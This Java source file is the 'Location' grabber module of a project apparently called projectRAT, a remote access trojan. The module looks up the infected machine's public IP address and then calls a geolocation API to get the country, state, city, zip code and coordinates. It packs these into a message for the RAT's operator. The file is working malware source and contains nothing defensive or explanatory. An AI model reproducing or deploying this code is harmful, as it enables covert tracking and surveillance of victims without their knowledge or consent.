package in.momin5.projectRAT.request.grabbers;

import in.momin5.projectRAT.ProjectRAT;
import in.momin5.projectRAT.request.Request;
import org.json.simple.JSONObject;
import org.json.simple.parser.JSONParser;

import java.io.BufferedReader;
import java.io.File;
import java.io.InputStreamReader;
import java.net.URL;

public class Location implements Request {

    String message;

    @Override
    public void init() throws Exception {
        URL checkIP = new URL("http://checkip.amazonaws.com");
        URL geoLocURL = new URL("https://api.ipgeolocation.io/ipgeo?apiKey=" + ProjectRAT.apiKey);

        BufferedReader br = new BufferedReader(new InputStreamReader(checkIP.openStream()));
        JSONObject response = (JSONObject) new JSONParser().parse(new BufferedReader(new InputStreamReader(geoLocURL.openStream())));

        String ip = br.readLine();
        String country 	= (String) response.get("country_name");
        String state	= (String) response.get("state_prov");
        String city		= (String) response.get("city");
        String zip 		= (String) response.get("zipcode");
        String lat 		= (String) response.get("latitude");
        String lon 		= (String) response.get("longitude");

        message = String.format("IP: %s \nCountry: %s \nState: %s \nCity: %s \nZip Code: %s \nLatitude: %s \nLongitude: %s",ip,country,state,city,zip,lat,lon);
    }

    @Override
    public String getMessage() {
        return message;
    }

    @Override
    public File[] getFiles() {
        return null;
    }
}
